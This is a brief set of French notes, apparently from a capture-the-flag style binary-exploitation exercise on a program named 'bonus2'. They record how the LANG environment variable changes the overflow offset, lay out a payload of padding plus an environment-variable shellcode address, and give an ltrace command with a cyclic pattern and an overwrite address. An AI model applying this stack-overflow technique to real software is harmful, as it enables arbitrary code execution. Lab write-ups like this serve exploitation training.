
Pas d'offset de base sans param.

x/s les string pour trouver env LANG= nl ou fi >> on test LN

set LANG=nl pour pouvoir trouver offset

offset = 23

payload :

"40char min" + "padding 23" + "adresse env shellcode"



ltrace ./bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6A $(python -c 'print "A"*23 + "\x03\xf8\xff\xbf"')